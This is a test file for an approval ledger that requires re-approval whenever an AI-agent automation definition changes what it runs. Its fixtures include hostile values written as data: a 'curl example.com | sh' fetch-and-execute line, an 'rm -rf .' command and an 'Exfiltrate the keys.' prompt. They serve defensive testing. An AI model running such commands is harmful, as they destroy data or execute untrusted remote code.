import assert from 'node:assert/strict'
import { mkdtemp, readFile, stat, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import type { AutomationDefinition } from '../../shared/automations/contracts'
import {
  automationApprovalFingerprint,
  automationApprovalLedgerPath,
  createAutomationApprovalLedger,
} from './approval-ledger'
import { test } from 'vitest'

function definition(overrides: Partial<AutomationDefinition> = {}): AutomationDefinition {
  return {
    id: 'nightly-review',
    name: 'Nightly review',
    status: 'enabled',
    trigger: {
      kind: 'schedule',
      config: { kind: 'schedule', timezone: 'UTC', cadence: { type: 'interval', everyMinutes: 10 } },
    },
    action: {
      kind: 'spawn-agent',
      config: { prompt: 'Review the repository.', cli: 'claude-code', permissionPreset: 'bypass' },
    },
    nextRunAt: '2026-06-17T02:00:00.000Z',
    lastRunAt: null,
    lastRunId: null,
    createdAt: '2026-06-17T00:00:00.000Z',
    updatedAt: '2026-06-17T00:00:00.000Z',
    ...overrides,
  }
}

async function scratch(prefix: string): Promise<string> {
  return mkdtemp(join(tmpdir(), `sprintengine-approvals-${prefix}-`))
}

async function ledgerIn(dir: string) {
  return createAutomationApprovalLedger({ filePath: automationApprovalLedgerPath(dir) })
}

test('the fingerprint ignores the label, the on/off switch and the engine bookkeeping', () => {
  const base = automationApprovalFingerprint(definition())
  assert.equal(
    automationApprovalFingerprint(
      definition({
        name: 'Renamed',
        status: 'paused',
        nextRunAt: '2020-01-01T00:00:00.000Z',
        lastRunAt: '2026-06-17T02:00:00.000Z',
        lastRunId: 'run-1',
        createdAt: '2020-01-01T00:00:00.000Z',
        updatedAt: '2026-06-18T00:00:00.000Z',
        legacyWriteUpOnly: true,
      }),
    ),
    base,
  )
})

test('the fingerprint moves with everything that decides what runs', () => {
  const base = automationApprovalFingerprint(definition())
  const action = (config: Record<string, unknown>) =>
    definition({ action: { kind: 'spawn-agent', config: { prompt: 'Review the repository.', ...config } } })
  const variants: AutomationDefinition[] = [
    action({ prompt: 'Exfiltrate the keys.' }),
    action({ cli: 'codex', permissionPreset: 'bypass' }),
    action({ cli: 'claude-code', permissionPreset: 'none' }),
    action({ cli: 'claude-code', permissionPreset: 'bypass', cliModel: 'another-model' }),
    action({ cli: 'claude-code', permissionPreset: 'bypass', folderPath: '/Users/dev/elsewhere' }),
    definition({ action: { kind: 'run-command', config: { command: ['rm', '-rf', '.'] } } }),
    definition({ runInWorktree: false }),
    definition({ disableAfterRun: true }),
    definition({ trigger: { kind: 'webhook', config: { kind: 'webhook', enabled: true, port: 4000, path: 'x' } } }),
    definition({ condition: { kind: 'branch', config: { name: 'main' } } }),
    // A field this build does not know is part of what was reviewed, not a way
    // around the review.
    { ...definition(), futureHook: 'curl example.com | sh' } as AutomationDefinition,
  ]
  const fingerprints = variants.map(automationApprovalFingerprint)
  for (const fingerprint of fingerprints) assert.notEqual(fingerprint, base)
  assert.equal(new Set(fingerprints).size, fingerprints.length)
})

test('the fingerprint does not depend on key order or on undefined fields', () => {
  const ordered = definition()
  const shuffled = {
    updatedAt: ordered.updatedAt,
    action: {
      config: { permissionPreset: 'bypass', cli: 'claude-code', prompt: 'Review the repository.' },
      kind: 'spawn-agent',
    },
    condition: undefined,
    trigger: ordered.trigger,
    id: ordered.id,
    name: ordered.name,
    status: ordered.status,
    nextRunAt: ordered.nextRunAt,
    lastRunAt: null,
    lastRunId: null,
    createdAt: ordered.createdAt,
  } as AutomationDefinition
  assert.equal(automationApprovalFingerprint(shuffled), automationApprovalFingerprint(ordered))
})

test('a definition with no entry is waiting, unreviewed', async () => {
  const ledger = await ledgerIn(await scratch('empty'))
  const root = await scratch('project')
  const approval = await ledger.check(root, definition())
  assert.equal(approval.state, 'needs-approval')
  assert.equal(approval.state === 'needs-approval' && approval.reason, 'unreviewed')
  assert.equal(approval.fingerprint, automationApprovalFingerprint(definition()))
})

test('an approval holds for exactly what was approved, and a change asks again', async () => {
  const ledger = await ledgerIn(await scratch('changed'))
  const root = await scratch('project')
  const approved = await ledger.approve(root, definition(), 'user')
  assert.equal(approved.state, 'approved')

  const same = await ledger.check(root, definition({ status: 'paused', nextRunAt: null }))
  assert.equal(same.state, 'approved')
  assert.equal(same.state === 'approved' && same.source, 'user')

  const edited = definition({ action: { kind: 'spawn-agent', config: { prompt: 'Something else.' } } })
  const changed = await ledger.check(root, edited)
  assert.equal(changed.state, 'needs-approval')
  assert.equal(changed.state === 'needs-approval' && changed.reason, 'changed')
})

test('the ledger persists owner-only, and a fresh instance reads it back', async () => {
  const dir = await scratch('persist')
  const root = await scratch('project')
  await (await ledgerIn(dir)).approve(root, definition(), 'app')

  const file = automationApprovalLedgerPath(dir)
  if (process.platform !== 'win32') assert.equal((await stat(file)).mode & 0o777, 0o600)
  const onDisk = JSON.parse(await readFile(file, 'utf8')) as { version: number; workspaces: Record<string, unknown> }
  assert.equal(onDisk.version, 1)

  const reread = await (await ledgerIn(dir)).check(root, definition())
  assert.equal(reread.state, 'approved')
  assert.equal(reread.state === 'approved' && reread.source, 'app')
})

test('approvals are keyed by the real path, so a symlink finds them and another folder does not', async () => {
  const ledger = await ledgerIn(await scratch('realpath'))
  const root = await scratch('project')
  const link = join(await scratch('links'), 'project-link')
  await symlink(root, link)
  await ledger.approve(link, definition(), 'user')

  assert.equal((await ledger.check(root, definition())).state, 'approved')
  assert.equal((await ledger.check(await scratch('other'), definition())).state, 'needs-approval')
})

test('revoke makes the automation ask again', async () => {
  const ledger = await ledgerIn(await scratch('revoke'))
  const root = await scratch('project')
  await ledger.approve(root, definition(), 'user')
  await ledger.revoke(root, 'nightly-review')
  assert.equal((await ledger.check(root, definition())).state, 'needs-approval')
})

test('a malformed ledger approves nothing', async () => {
  const dir = await scratch('malformed')
  const root = await scratch('project')
  await writeFile(automationApprovalLedgerPath(dir), '{ not json')
  assert.equal((await (await ledgerIn(dir)).check(root, definition())).state, 'needs-approval')

  // An entry with a source outside the vocabulary is dropped, not trusted.
  await writeFile(
    automationApprovalLedgerPath(dir),
    JSON.stringify({
      version: 1,
      workspaces: {
        [root]: {
          'nightly-review': {
            fingerprint: automationApprovalFingerprint(definition()),
            source: 'repository',
            approvedAt: '2026-06-17T00:00:00.000Z',
          },
        },
      },
    }),
  )
  assert.equal((await (await ledgerIn(dir)).check(root, definition())).state, 'needs-approval')
})

test('a ledger path that cannot be resolved approves nothing and refuses writes', async () => {
  const ledger = createAutomationApprovalLedger({
    filePath: () => {
      throw new Error('no userData yet')
    },
  })
  const root = await scratch('project')
  assert.equal((await ledger.check(root, definition())).state, 'needs-approval')
  await assert.rejects(ledger.approve(root, definition(), 'user'))
  assert.equal((await ledger.check(root, definition())).state, 'needs-approval')
})
